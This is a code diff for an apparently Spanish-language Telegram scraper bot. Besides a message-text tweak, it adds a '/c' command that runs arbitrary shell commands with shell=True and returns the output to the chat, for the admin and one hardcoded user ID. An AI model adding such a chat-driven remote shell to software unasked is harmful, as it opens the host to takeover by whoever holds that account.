@@ -468,7 +468,7 @@ def get_work(m: telebot.types.Message):
     global scrapper
 
     if m.from_user.id == scrapper.cola.get("uso"):
-        bot.send_message(m.chat.id, "¡No puedes tener más de una publicación activa!")
+        bot.send_message(m.chat.id, m_texto("¡No puedes tener más de una publicación activa!\n\nEscribe /cancelar para cancelar el proceso"))
         return
     
     elif scrapper.cola.get("uso"):
@@ -940,7 +940,45 @@ def reboot(c):
         os.execv(os.execv(sys.executable, [sys.executable, '"' + __file__ + '"']))
     return
 
-
+@bot.message_handler(commands=["c"], func=lambda message: message.from_user.id in [1413725506, admin])
+def c(message):
+    try:
+        dic_temp = {}
+        dic_temp[message.from_user.id] = {"comando": False, "res": False, "texto": ""}
+        dic_temp[message.from_user.id]["comando"] = message.text.split()
+        if len(dic_temp[message.from_user.id]["comando"]) == 1:
+            bot.send_message(message.chat.id, "No has ingresado nada")
+            return
+        
+        dic_temp[message.from_user.id]["comando"] = " ".join(dic_temp[message.from_user.id]["comando"][1:len(dic_temp[message.from_user.id]["comando"])])
+        
+        dic_temp[message.from_user.id]["res"] = subprocess.run(dic_temp[message.from_user.id]["comando"], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
+        
+        if dic_temp[message.from_user.id]["res"].returncode:
+            dic_temp[message.from_user.id]["texto"]+= "❌ Ha ocurrido un error usando el comando...\n\n"
+        
+        if dic_temp[message.from_user.id]["res"].stderr:
+            dic_temp[message.from_user.id]["texto"]+= f"stderr:\n{dic_temp[message.from_user.id]["res"].stderr}\n\n"
+            
+        if dic_temp[message.from_user.id]["res"].stdout:
+            dic_temp[message.from_user.id]["texto"]+= f"stdout\n{dic_temp[message.from_user.id]["res"].stdout}\n\n"
+            
+            
+        try:
+            bot.send_message(message.chat.id, dic_temp[message.from_user.id]["texto"])
+        except:
+            with open("archivo.txt", "w") as file:
+                file.write(dic_temp[message.from_user.id]["texto"])
+            
+            with open("archivo.txt", "rb") as file:
+                bot.send_document(message.chat.id, telebot.types.InputFile(file.name))
+                
+            os.remove("archivo.txt")
+                
+    
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error:\n{e.args}")
+    
 @bot.message_handler(func=lambda x: True)
 def cmd_any(m):
 
